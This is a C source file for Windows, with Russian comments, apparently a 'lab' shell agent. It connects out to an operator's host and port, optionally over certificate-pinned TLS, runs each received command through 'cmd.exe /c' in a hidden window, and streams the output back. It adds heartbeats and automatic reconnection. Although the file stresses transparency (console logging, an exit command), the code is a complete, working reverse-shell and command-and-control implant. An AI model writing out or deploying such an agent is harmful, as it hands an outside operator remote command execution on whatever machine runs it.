/* lab-agent.c — учебный shell-агент v2 (лаборатория, прозрачный)
 *
 * v2 = TLS-транспорт через Schannel + пининг сертификата сервера по SHA-256.
 * Режимы запуска:
 *   lab-agent.exe HOST PORT              — plaintext v1 (для регрессии/сравнения)
 *   lab-agent.exe HOST PORT <sha256pin>  — TLS, обрыв если отпечаток сервера != pin
 * Уроки v2:
 *  - pin = отпечаток СЕРВЕРНОГО сертификата; проверка наша, а неtrust-store:
 *    SCH_CRED_MANUAL_CRED_VALIDATION отключает системную валидацию, после
 *    рукопожатия достаём SECPKG_ATTR_REMOTE_CERT_CONTEXT и сравниваем хэш.
 *  - Schannel шифрует кусками cbMaximumMessage (~16КБ): encrypt-цикл в xsend,
 *    DecryptMessage с INCOMPLETE_MESSAGE/EXTRA-буферами в xrecv.
 *  - plaintext и TLS живут за одним слоем xsend/xrecv — протокол v1 не меняется.
 *
 * v1 (всё ещё в силе): length-prefix кадры <u32 magic BA01><type><len><payload>,
 * CMD/OUT/END/PING, heartbeat 5с, reconnect backoff+jitter, Job Object,
 * CRITICAL_SECTION против конкурентной записи в сокет.
 *
 * Всё видно: имя честное, каждая команда печатается в консоль, exit останавливает.
 * Сборка: build.py (gcc -O2 -Wall ... -lws2_32 -lsecur32 -ladvapi32 -lcrypt32)
 */
#define SECURITY_WIN32
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <security.h>
#include <schannel.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAGIC       0x31414142u
#define T_CMD       1u
#define T_OUT       2u
#define T_END       3u
#define T_PING      4u
#define HDR_LEN     12u
#define RECV_TIMEOUT_MS 15000

/* ── глобальное состояние транспорта ── */
static SOCKET g_sock = INVALID_SOCKET;
static CRITICAL_SECTION g_send_lock;
static volatile LONG g_sock_live = 0;

static int  g_tls = 0;                 /* 1 = Schannel-режим */
static char g_pin[128] = "";           /* ожидаемый sha256 серверного сертификата */
static CredHandle g_cred;              /* ручки Schannel живут на всё соединение */
static CtxtHandle g_ctxt;
static SecPkgContext_StreamSizes g_stream;
static int g_tls_ok = 0;

/* приёмный буфер расшифрованного текста */
static BYTE g_rbuf[131072];
static int  g_rlen = 0, g_rpos = 0;
/* накопитель шифротекста для DecryptMessage */
static BYTE g_ct[131072];
static int  g_ctlen = 0;

/* ── низкий уровень: sendall по сырому сокету ── */
static int sendall_raw(const char *buf, int len) {
    int off = 0;
    while (off < len) {
        int w = send(g_sock, buf + off, len - off, 0);
        if (w == SOCKET_ERROR) return 0;
        off += w;
    }
    return 1;
}

/* ── Schannel: рукопожатие + пин сервера ── */
static int hex2bin(const char *hex, BYTE *out, int maxbin) {
    int n = (int)strlen(hex), k = 0;
    if (n % 2) return 0;
    for (int i = 0; i < n; i += 2, k++) {
        if (k >= maxbin) return 0;
        unsigned v;
        if (sscanf(hex + i, "%2x", &v) != 1) return 0;
        out[k] = (BYTE)v;
    }
    return k;
}

static int tls_handshake(void) {
    SCHANNEL_CRED cred;
    memset(&cred, 0, sizeof cred);
    cred.dwVersion = SCHANNEL_CRED_VERSION;
    cred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;
    cred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | SCH_CRED_MANUAL_CRED_VALIDATION;

    TimeStamp exp;
    SECURITY_STATUS st = AcquireCredentialsHandleW(NULL, UNISP_NAME_W,
                            SECPKG_CRED_OUTBOUND, NULL, &cred, NULL, NULL, &g_cred, &exp);
    if (st != SEC_E_OK) {
        printf("[lab-agent] AcquireCredentialsHandle err=0x%08lx\n", (unsigned long)st);
        return 0;
    }

    CtxtHandle ctxt;
    ULONG attrs = 0;
    SecBuffer out = { 0, SECBUFFER_TOKEN, NULL };
    SecBufferDesc outd = { SECBUFFER_VERSION, 1, &out };
    BYTE inbuf[65536];
    int inlen = 0;
    int have_ctxt = 0;

    st = SEC_I_CONTINUE_NEEDED;
    for (;;) {
        if (st == SEC_E_INCOMPLETE_MESSAGE) {
            /* нужно больше шифротекста от сервера */
            if (inlen >= (int)sizeof inbuf) { printf("[lab-agent] handshake: переполнение буфера\n"); return 0; }
            int r = recv(g_sock, (char *)inbuf + inlen, (int)sizeof inbuf - inlen, 0);
            if (r <= 0) { printf("[lab-agent] handshake: сервер молчит (r=%d)\n", r); return 0; }
            inlen += r;
        } else {
            /* выслать исходящий токен */
            if (out.pvBuffer) {
                if (!sendall_raw((char *)out.pvBuffer, out.cbBuffer)) {
                    printf("[lab-agent] handshake: send err=%d\n", WSAGetLastError());
                    return 0;
                }
                FreeContextBuffer(out.pvBuffer);
                out.pvBuffer = NULL; out.cbBuffer = 0;
            }
            if (st == SEC_E_OK) break;
        }

        SecBuffer inb[2] = {
            { (ULONG)inlen, SECBUFFER_TOKEN, inbuf },
            { 0, SECBUFFER_EMPTY, NULL }
        };
        SecBufferDesc ind = { SECBUFFER_VERSION, 2, inb };

        if (!have_ctxt) {
            TimeStamp exp1;
            st = InitializeSecurityContextW(&g_cred, NULL, (SEC_WCHAR *)L"lab-agent",
                    ISC_REQ_CONFIDENTIALITY | ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT |
                    ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION,
                    0, SECURITY_NATIVE_DREP, inlen ? &ind : NULL, 0, &ctxt, &outd, &attrs, &exp1);
            if (st != SEC_E_INCOMPLETE_MESSAGE && st != SEC_I_CONTINUE_NEEDED &&
                st != SEC_E_OK && st != SEC_I_INCOMPLETE_CREDENTIALS) {
                printf("[lab-agent] ISC(first) err=0x%08lx\n", (unsigned long)st);
                return 0;
            }
            if (st != SEC_E_INCOMPLETE_MESSAGE) have_ctxt = 1;
        } else {
            TimeStamp exp2;
            st = InitializeSecurityContextW(&g_cred, &ctxt, NULL,
                    ISC_REQ_CONFIDENTIALITY | ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT |
                    ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_MANUAL_CRED_VALIDATION,
                    0, SECURITY_NATIVE_DREP, &ind, 0, &ctxt, &outd, &attrs, &exp2);
            if (st != SEC_E_INCOMPLETE_MESSAGE && st != SEC_I_CONTINUE_NEEDED &&
                st != SEC_E_OK && st != SEC_I_INCOMPLETE_CREDENTIALS) {
                printf("[lab-agent] ISC err=0x%08lx\n", (unsigned long)st);
                return 0;
            }
        }

        /* EXTRA: часть входа не съедена — сдвигаем в начало */
        if (inlen) {
            for (ULONG i = 0; i < 2; i++) {
                if (inb[i].BufferType == SECBUFFER_EXTRA && inb[i].cbBuffer) {
                    memmove(inbuf, (BYTE *)inb[i].pvBuffer, inb[i].cbBuffer);
                    inlen = inb[i].cbBuffer;
                    goto extra_done;
                }
            }
            inlen = 0;
        extra_done:;
        }
    }

    SecPkgContext_StreamSizes ss;
    if (QueryContextAttributesW(&ctxt, SECPKG_ATTR_STREAM_SIZES, &ss) != SEC_E_OK) {
        printf("[lab-agent] STREAM_SIZES err\n");
        return 0;
    }
    g_stream = ss;

    /* ── пин: sha256 сертификата сервера ── */
    PCCERT_CONTEXT rc = NULL;
    if (QueryContextAttributesW(&ctxt, SECPKG_ATTR_REMOTE_CERT_CONTEXT, &rc) != SEC_E_OK || !rc) {
        printf("[lab-agent] сервер не предъявил сертификат\n");
        return 0;
    }
    BYTE hash[32];
    DWORD hlen = sizeof hash;
    if (!CryptHashCertificate(0, CALG_SHA_256, 0, rc->pbCertEncoded, rc->cbCertEncoded, hash, &hlen)) {
        printf("[lab-agent] CryptHashCertificate err\n");
        CertFreeCertificateContext(rc);
        return 0;
    }
    CertFreeCertificateContext(rc);

    char hex[65];
    for (int i = 0; i < 32; i++) snprintf(hex + i * 2, 3, "%02x", hash[i]);
    printf("[lab-agent] серверный сертификат sha256=%s\n", hex);
    BYTE want[32];
    int wn = hex2bin(g_pin, want, 32);
    if (wn != 32 || memcmp(hash, want, 32) != 0) {
        printf("[lab-agent] ПИН НЕ СОШЁЛСЯ (ожидали %s) — обрываем\n", g_pin);
        return 0;
    }
    printf("[lab-agent] pin сошёлся — TLS-канал готов\n");

    g_ctxt = ctxt;
    g_tls_ok = 1;
    return 1;
}

/* ── xsend: шифрует и шлёт; в plaintext-режиме просто sendall ── */
static int xsend(const char *buf, int len) {
    if (!g_tls) return sendall_raw(buf, len);
    while (len > 0) {
        int chunk = len > (int)g_stream.cbMaximumMessage ? (int)g_stream.cbMaximumMessage : len;
        static BYTE msg[65536];
        if ((int)(g_stream.cbHeader + chunk + g_stream.cbTrailer) > (int)sizeof msg) return 0;
        SecBuffer bufs[4] = {
            { g_stream.cbHeader, SECBUFFER_STREAM_HEADER, msg },
            { (ULONG)chunk, SECBUFFER_DATA, msg + g_stream.cbHeader },
            { g_stream.cbTrailer, SECBUFFER_STREAM_TRAILER, msg + g_stream.cbHeader + chunk },
            { 0, SECBUFFER_EMPTY, NULL }
        };
        memcpy(bufs[1].pvBuffer, buf, chunk);
        SecBufferDesc desc = { SECBUFFER_VERSION, 4, bufs };
        if (EncryptMessage(&g_ctxt, 0, &desc, 0) != SEC_E_OK) return 0;
        int total = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
        if (!sendall_raw((char *)msg, total)) return 0;
        buf += chunk;
        len -= chunk;
    }
    return 1;
}

/* ── xrecv: расшифровывает; возвращает >0 байт, 0 = EOF, -1 = ошибка ── */
static int xrecv(char *buf, int want) {
    if (!g_tls) {
        int r = recv(g_sock, buf, want, 0);
        return r == SOCKET_ERROR ? -1 : r;
    }
    while (g_rlen - g_rpos == 0) {
        if (g_ctlen == 0) {
            int r = recv(g_sock, (char *)g_ct, sizeof g_ct, 0);
            if (r == 0) return 0;
            if (r == SOCKET_ERROR) return -1;
            g_ctlen = r;
        }
        for (;;) {
            SecBuffer bufs[4] = {
                { (ULONG)g_ctlen, SECBUFFER_DATA, g_ct },
                { 0, SECBUFFER_EMPTY, NULL },
                { 0, SECBUFFER_EMPTY, NULL },
                { 0, SECBUFFER_EMPTY, NULL }
            };
            SecBufferDesc desc = { SECBUFFER_VERSION, 4, bufs };
            SECURITY_STATUS st = DecryptMessage(&g_ctxt, &desc, 0, NULL);
            if (st == SEC_E_INCOMPLETE_MESSAGE) {
                int r = recv(g_sock, (char *)g_ct + g_ctlen, (int)sizeof g_ct - g_ctlen, 0);
                if (r == 0) return 0;   /* обрыв посреди записи */
                if (r == SOCKET_ERROR) return -1;
                g_ctlen += r;
                continue;
            }
            if (st != SEC_E_OK) {
                printf("[lab-agent] DecryptMessage err=0x%08lx\n", (unsigned long)st);
                return -1;
            }
            BYTE *data = NULL;
            int dlen = 0, extra = 0;
            for (int i = 0; i < 4; i++) {
                if (bufs[i].BufferType == SECBUFFER_DATA) { data = bufs[i].pvBuffer; dlen = bufs[i].cbBuffer; }
                else if (bufs[i].BufferType == SECBUFFER_EXTRA) { extra = bufs[i].cbBuffer; }
            }
            if (dlen) {
                if (g_rlen + dlen > (int)sizeof g_rbuf) return -1;  /* не должны сюда попадать */
                memcpy(g_rbuf + g_rlen, data, dlen);
                g_rlen += dlen;
            }
            if (extra) memmove(g_ct, g_ct + (g_ctlen - extra), extra);
            g_ctlen = extra;
            break;
        }
    }
    int n = want < g_rlen - g_rpos ? want : g_rlen - g_rpos;
    memcpy(buf, g_rbuf + g_rpos, n);
    g_rpos += n;
    if (g_rpos == g_rlen) g_rpos = g_rlen = 0;
    return n;
}

static void send_frame_raw(unsigned type, const char *payload, unsigned len) {
    if (!InterlockedCompareExchange(&g_sock_live, 0, 0)) return;
    unsigned char hdr[HDR_LEN];
    unsigned magic = MAGIC;
    memcpy(hdr + 0, &magic, 4);
    memcpy(hdr + 4, &type, 4);
    memcpy(hdr + 8, &len, 4);
    EnterCriticalSection(&g_send_lock);
    int ok = xsend((char *)hdr, HDR_LEN) && (len == 0 || xsend(payload, (int)len));
    LeaveCriticalSection(&g_send_lock);
    (void)ok;
}

static int recv_full(char *buf, unsigned need) {
    unsigned got = 0;
    while (got < need) {
        int r = xrecv((char *)buf + got, (int)(need - got));
        if (r <= 0) return 0;
        got += (unsigned)r;
    }
    return 1;
}

/* ждёт CMD-фрейм; PING отвечает эхом; обрыв -> 0 */
static int wait_cmd(char **out, unsigned *outlen) {
    unsigned char hdr[HDR_LEN];
    for (;;) {
        if (!recv_full((char *)hdr, HDR_LEN)) {
            printf("[lab-agent] recv hdr fail: WSAerr=%d\n", WSAGetLastError());
            fflush(stdout);
            return 0;
        }
        unsigned magic, type, len;
        memcpy(&magic, hdr + 0, 4);
        memcpy(&type,  hdr + 4, 4);
        memcpy(&len,   hdr + 8, 4);
        if (magic != MAGIC) {
            printf("[lab-agent] битый magic=%08x — линк сломан\n", magic);
            fflush(stdout);
            return 0;
        }
        if (len > (64u << 20)) { printf("[lab-agent] гигантский фрейм — обрываем\n"); fflush(stdout); return 0; }
        if (type == T_PING) {
            /* payload кадра ОБЯЗАН быть вычитан до ответа (урок v1) */
            char pl[64];
            if (len) {
                if (len > sizeof pl) { printf("[lab-agent] PING len=%u слишком большой\n", len); fflush(stdout); return 0; }
                if (!recv_full(pl, len)) {
                    printf("[lab-agent] recv ping payload fail: WSAerr=%d\n", WSAGetLastError());
                    fflush(stdout);
                    return 0;
                }
            }
            send_frame_raw(T_PING, "pong", 4);
            continue;
        }
        if (type == T_CMD) {
            char *buf = (char *)malloc(len + 1);
            if (!buf) return 0;
            if (len && !recv_full(buf, len)) {
                printf("[lab-agent] recv payload fail: WSAerr=%d\n", WSAGetLastError());
                fflush(stdout);
                free(buf);
                return 0;
            }
            buf[len] = '\0';
            *out = buf; *outlen = len;
            return 1;
        }
        printf("[lab-agent] неожиданный тип фрейма %u\n", type);
        fflush(stdout);
        return 0;
    }
}

/* ── exec-модуль: cmd.exe /c, вывод в OUT-кадры ── */
static void run_command(const char *line, unsigned nlen) {
    HANDLE job = CreateJobObjectW(NULL, NULL);
    if (job) {
        JOBOBJECT_EXTENDED_LIMIT_INFORMATION jl;
        memset(&jl, 0, sizeof jl);
        jl.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
        SetInformationJobObject(job, JobObjectExtendedLimitInformation, &jl, sizeof jl);
    }

    SECURITY_ATTRIBUTES sa = { sizeof sa, NULL, TRUE };
    HANDLE rd = NULL, wr = NULL;
    if (!CreatePipe(&rd, &wr, &sa, 0)) {
        send_frame_raw(T_END, "pipe_err", 8);
        if (job) CloseHandle(job);
        return;
    }
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    wchar_t wcmd[16384];
    char final[16400];
    if (nlen >= sizeof final - 16) nlen = sizeof final - 16;
    memcpy(final, "cmd.exe /c ", 11);
    memcpy(final + 11, line, nlen);
    final[11 + nlen] = '\0';
    MultiByteToWideChar(CP_UTF8, 0, final, -1, wcmd, 16384);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof si);
    memset(&pi, 0, sizeof pi);
    si.cb = sizeof si;
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput  = NULL;
    si.hStdOutput = wr;
    si.hStdError  = wr;

    BOOL ok = CreateProcessW(NULL, wcmd, NULL, NULL, TRUE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(wr);
    if (!ok) {
        DWORD e = GetLastError();
        char msg[64];
        int m = snprintf(msg, sizeof msg, "createprocess_%lu", (unsigned long)e);
        send_frame_raw(T_END, msg, (unsigned)m);
        CloseHandle(rd);
        if (job) CloseHandle(job);
        return;
    }
    if (job) AssignProcessToJobObject(job, pi.hProcess);

    /* EOF по пайпу не ждём: внук мог унаследовать write-конец (урок v0/v1) */
    char buf[65536];
    DWORD got = 0;
    for (;;) {
        DWORD avail = 0;
        if (!PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL)) break;
        if (avail > 0) {
            DWORD want = avail < sizeof buf ? avail : sizeof buf;
            if (!ReadFile(rd, buf, want, &got, NULL) || got == 0) break;
            send_frame_raw(T_OUT, buf, got);
            continue;
        }
        if (WaitForSingleObject(pi.hProcess, 200) == WAIT_OBJECT_0) {
            for (;;) {
                DWORD rest = 0;
                if (!PeekNamedPipe(rd, NULL, 0, NULL, &rest, NULL) || rest == 0) break;
                DWORD want2 = rest < sizeof buf ? rest : sizeof buf;
                if (!ReadFile(rd, buf, want2, &got, NULL) || got == 0) break;
                send_frame_raw(T_OUT, buf, got);
            }
            break;
        }
    }
    CloseHandle(rd);

    WaitForSingleObject(pi.hProcess, 5000);
    DWORD exitcode = 0;
    GetExitCodeProcess(pi.hProcess, &exitcode);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    if (job) CloseHandle(job);   /* kill-on-job-close добивает внуков */

    char tail[48];
    int t = snprintf(tail, sizeof tail, "%lu", (unsigned long)exitcode);
    send_frame_raw(T_END, tail, (unsigned)t);
}

/* ── heartbeat-поток: PING раз в 5с; гасится event'ом ── */
static HANDLE g_hb_stop = NULL;

static DWORD WINAPI heartbeat(LPVOID arg) {
    (void)arg;
    for (;;) {
        if (g_hb_stop == NULL) { Sleep(5000); continue; }
        DWORD w = WaitForSingleObject(g_hb_stop, 5000);
        if (w == WAIT_OBJECT_0) return 0;
        send_frame_raw(T_PING, "ping", 4);
    }
}

static int agent_session(const char *host, unsigned short port) {
    WSADATA wsa;
    InitializeCriticalSection(&g_send_lock);
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        fprintf(stderr, "[lab-agent] WSAStartup failed\n");
        return 1;
    }

    int attempt = 0;
    for (;;) {
        unsigned delay_ms = attempt == 0 ? 0 : (500u << (attempt - 1));
        if (delay_ms > 30000u) delay_ms = 30000u;
        static unsigned rng = 0x1234567u;
        rng ^= rng << 13; rng ^= rng >> 17; rng ^= rng << 5;
        delay_ms = delay_ms ? delay_ms / 2 + rng % (delay_ms / 2 + 1) : 0;
        if (delay_ms) {
            printf("[lab-agent] reconnect #%d через %ums\n", attempt, delay_ms);
            Sleep(delay_ms);
        }

        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) { fprintf(stderr, "[lab-agent] socket failed err=%d\n", WSAGetLastError()); return 1; }

        DWORD tmo = RECV_TIMEOUT_MS;
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char *)&tmo, sizeof tmo);

        struct sockaddr_in a;
        memset(&a, 0, sizeof a);
        a.sin_family = AF_INET;
        a.sin_port = htons(port);
        if (inet_pton(AF_INET, host, &a.sin_addr) != 1) {
            fprintf(stderr, "[lab-agent] bad host: %s\n", host);
            return 1;
        }
        printf("[lab-agent] connect %s:%u (%s) ...\n", host, port, g_tls ? "TLS" : "plain");
        if (connect(s, (struct sockaddr *)&a, sizeof a) != 0) {
            printf("[lab-agent] не подключились (err=%d)\n", WSAGetLastError());
            closesocket(s);
            if (attempt < 6) attempt++;
            continue;
        }

        g_sock = s;
        if (g_tls) {
            if (!tls_handshake()) {
                /* пин не сошёлся / TLS сломан — это фатально, не реконнектимся
                 * (иначе крутимся вечно против чужого сервера) */
                printf("[lab-agent] TLS-рукопожатие не удалось — выходим\n");
                closesocket(s);
                WSACleanup();
                return 2;
            }
        }
        InterlockedExchange(&g_sock_live, 1);
        attempt = 0;
        printf("[lab-agent] online -> %s:%u (процесс виден в диспетчере задач)\n", host, port);

        g_hb_stop = CreateEventW(NULL, TRUE, FALSE, NULL);
        HANDLE hb = CreateThread(NULL, 0, heartbeat, NULL, 0, NULL);

        for (;;) {
            char *cmd = NULL;
            unsigned clen = 0;
            if (!wait_cmd(&cmd, &clen)) {
                printf("[lab-agent] линк потерян — переподключаемся\n");
                break;
            }
            printf("[lab-agent] cmd (%u bytes): %s\n", clen, cmd);
            if (clen == 4 && memcmp(cmd, "exit", 4) == 0) {
                send_frame_raw(T_END, "exit", 4);
                free(cmd);
                SetEvent(g_hb_stop);
                WaitForSingleObject(hb, 2000);
                CloseHandle(hb);
                CloseHandle(g_hb_stop);
                g_hb_stop = NULL;
                InterlockedExchange(&g_sock_live, 0);
                if (g_tls_ok) { DeleteSecurityContext(&g_ctxt); g_tls_ok = 0; }
                FreeCredentialsHandle(&g_cred);
                closesocket(s);
                WSACleanup();
                printf("[lab-agent] stopped (exit от оператора)\n");
                return 0;
            }
            run_command(cmd, clen);
            free(cmd);
        }
        SetEvent(g_hb_stop);
        WaitForSingleObject(hb, 2000);
        CloseHandle(hb);
        CloseHandle(g_hb_stop);
        g_hb_stop = NULL;
        InterlockedExchange(&g_sock_live, 0);
        if (g_tls_ok) { DeleteSecurityContext(&g_ctxt); g_tls_ok = 0; }
        FreeCredentialsHandle(&g_cred);
        g_rlen = g_rpos = g_ctlen = 0;   /* буферы TLS чистим между сессиями */
        closesocket(s);
        g_sock = INVALID_SOCKET;
        if (attempt < 6) attempt++;
    }
}

int main(int argc, char **argv) {
    const char *host = argc > 1 ? argv[1] : "127.0.0.1";
    unsigned short port = (unsigned short)(argc > 2 ? atoi(argv[2]) : 4444);
    if (argc > 3) {
        g_tls = 1;
        snprintf(g_pin, sizeof g_pin, "%s", argv[3]);
    }
    setvbuf(stdout, NULL, _IONBF, 0);
    return agent_session(host, port);
}
